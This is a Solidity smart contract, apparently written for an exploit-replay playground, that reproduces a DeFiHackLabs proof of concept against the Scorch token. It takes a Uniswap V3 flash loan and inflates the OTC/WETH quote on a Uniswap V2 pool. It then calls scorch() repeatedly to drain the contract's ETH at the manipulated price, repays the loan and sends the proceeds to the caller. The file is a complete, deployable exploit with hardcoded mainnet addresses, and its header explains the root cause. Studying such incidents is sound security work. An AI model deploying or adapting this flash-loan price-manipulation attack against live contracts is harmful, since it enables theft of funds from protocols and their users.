// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-02-Scorch).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the Uniswap V3 flash-loan callback
// `uniswapV3FlashCallback` lives on the test itself), so there is no standalone
// contract to deploy. This contract is a faithful, self-contained copy of that
// inline attack so the playground can deploy it and record run(). Logic,
// constants, and the 8-iteration burn loop are copied verbatim from
// test/Scorch_exp.sol (ContractTest.testExploit / uniswapV3FlashCallback).
//
// Root cause: Scorch.scorch() pays out ETH using a LIVE Uniswap V2
// getAmountsOut()-derived quote from the manipulable OTC/WETH pool. The
// attacker inflates that quote with a WETH->OTC swap first, then repeatedly
// burns OTC for ETH at the inflated quote (draining Scorch's ETH balance),
// then sells the remaining OTC back to WETH and repays the flash loan.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface IUniswapV3Flash {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IScorch {
    function scorch(uint256 amount) external returns (bool);
}

contract ScorchDrain {
    address private constant SCORCH_TOKEN = 0xA3D0e72c8A2fE9127A77412BF34bEe5e4945bd49;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V3_FLASH_POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;
    address private constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    IUniswapV3Flash private constant flashPool = IUniswapV3Flash(UNISWAP_V3_FLASH_POOL);
    IUniswapV2Router private constant router = IUniswapV2Router(UNISWAP_V2_ROUTER);
    IScorch private constant scorchToken = IScorch(SCORCH_TOKEN);
    IERC20 private constant otc = IERC20(SCORCH_TOKEN);
    IWETH private constant weth = IWETH(WETH_TOKEN);

    function run() external {
        flashPool.flash(address(this), 0, 4 ether, "");

        uint256 remainingWeth = weth.balanceOf(address(this));
        if (remainingWeth > 0) {
            weth.withdraw(remainingWeth);
        }

        uint256 bal = address(this).balance;
        if (bal > 0) {
            (bool ok, ) = msg.sender.call{value: bal}("");
            require(ok, "sweep failed");
        }
    }

    function uniswapV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        require(msg.sender == UNISWAP_V3_FLASH_POOL, "unexpected callback");

        // step 1: buy OTC and inflate the OTC/WETH quote used by scorch().
        weth.approve(UNISWAP_V2_ROUTER, type(uint256).max);
        otc.approve(UNISWAP_V2_ROUTER, type(uint256).max);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH_TOKEN;
        buyPath[1] = SCORCH_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(4 ether, 0, buyPath, address(this), block.timestamp);

        // step 2: repeatedly burn OTC while the manipulated quote drains Scorch's ETH.
        address[] memory quotePath = new address[](2);
        quotePath[0] = SCORCH_TOKEN;
        quotePath[1] = WETH_TOKEN;
        for (uint256 i = 0; i < 8; i++) {
            uint256 availableEth = SCORCH_TOKEN.balance;
            if (availableEth < 0.01 ether) break;

            uint256 targetReward = 0.097 ether;
            if (targetReward > availableEth) {
                targetReward = (availableEth * 95) / 100;
            }

            uint256 burnAmount = router.getAmountsIn(targetReward, quotePath)[0];
            scorchToken.scorch(burnAmount);
        }

        // step 3: sell remaining OTC to WETH and wrap the ETH rewards from scorch().
        uint256 remainingOtc = otc.balanceOf(address(this));
        address[] memory sellPath = new address[](2);
        sellPath[0] = SCORCH_TOKEN;
        sellPath[1] = WETH_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(remainingOtc, 0, sellPath, address(this), block.timestamp);

        if (address(this).balance > 0) {
            weth.deposit{value: address(this).balance}();
        }

        // step 4: repay the WETH flash loan.
        weth.transfer(UNISWAP_V3_FLASH_POOL, 4 ether + fee1);
    }

    receive() external payable {}
}
